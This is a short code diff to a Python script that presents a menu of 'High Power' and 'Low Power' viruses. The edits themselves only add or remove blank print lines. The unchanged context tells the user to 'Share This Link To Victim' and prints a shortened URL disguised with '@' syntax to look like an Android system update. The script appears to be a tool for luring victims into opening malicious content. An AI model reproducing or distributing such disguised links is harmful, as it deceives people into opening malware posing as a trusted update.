@@ -22,7 +22,6 @@ def power_virus():
 	print("High Power Virus Made By King-Nazim")
 	print("")
 	print("Share This Link To Victim")
-        print("")
 	print("------------------------------------------")
 	slowprint("android.sys.update.com@bit.ly/3EAvZQ3")
 	print("")
@@ -41,7 +40,6 @@ def low_virus():
 	print("Low Power Virus Made By King-Nazim")
 	print("")
 	print("Share This Link To Victim")
-        print("")
 	print("--------------------------------------------")
 	slowprint("android.sys.update.com@bit.ly/3EAvZQ3")
 	print("")
@@ -65,6 +63,7 @@ print("----------------------------------------")
 print("")
 print("[1]High Power Virus")
 print("[2]Low Power Virus")
+print("")
 choos = input("Enter Your Option--->")
 
 if choos == '1':
